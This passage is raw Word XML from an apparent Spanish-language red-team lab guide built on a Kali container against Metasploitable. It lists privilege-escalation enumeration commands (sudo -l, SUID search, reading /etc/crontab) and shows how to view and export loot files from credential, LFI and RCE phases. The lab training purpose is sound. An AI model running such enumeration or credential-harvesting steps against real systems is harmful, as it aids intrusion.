        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">id                          # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>uid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=1000(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C17F290" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo -l                     # qué puede ejecutar como </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5DC143B2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>find / -perm -4000 2&gt;/dev/null | head -20   # binarios SUID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4EE525" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>cat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>crontab</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">            # tareas programadas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB9A259" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a                    # versión del </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>kernel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2F95E502" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247F4BCE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Evidencia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>generada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7C2578" w14:paraId="7BC90998" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="428BDBA7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="0A7669E4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="42094CE6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A820E24" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>linpeas-output.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A657A16" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Output completo de linpeas</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="64BA7693" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="79D7E227" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>run.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="6A0BE0C3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Hallazgos críticos filtrados</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6063C828" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="6F028FCE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5053B38B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>11. Ver evidencias</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361BAFF1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F397F39" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Toda la evidencia se guarda dentro del contenedor Kali en </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>loot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD2A345" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Ver </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>estructura</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> completa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACE67AF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali find /root/loot -type f | sort</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6C6156" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07DF2C5D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Ver evidencia de una fase específica</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B592AD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC8B4BD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>docker exec redteam-kali ls -lh /root/loot/phase-1-recon/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCA91D9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F4A0DD7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 4 — credenciales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0701F369" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali cat /root/loot/phase-4-credentials/&lt;timestamp&gt;/default-creds-results.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E3B1D2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A29CBB5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 5 — LFI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6078D9DC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali cat /root/loot/phase-5-exploitation/&lt;timestamp&gt;/lfi-passwd.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174AB779" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="286D5BAC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 5 — RCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0662B09A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali cat /root/loot/phase-5-exploitation/&lt;timestamp&gt;/upload-rce.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131DB2A1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="755A842E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Reemplazar </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> con el directorio listado (formato </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>YYYYMMDD-HHMMSS</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8DD3AB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Copiar evidencia al host (para el informe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FE23CE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"># Copiar todo el </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>loot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> al host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB08A20" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker cp </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali:/root/loot C:\Project-Red-Team\evidence-export</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EAFC3DE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47F9F81C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Copiar solo una fase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB0298E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker cp redteam-kali:/root/loot/phase-5-exploitation C:\Project-Red-Team\evidence-export\</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10370F32" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B4EA624" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="034876AB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
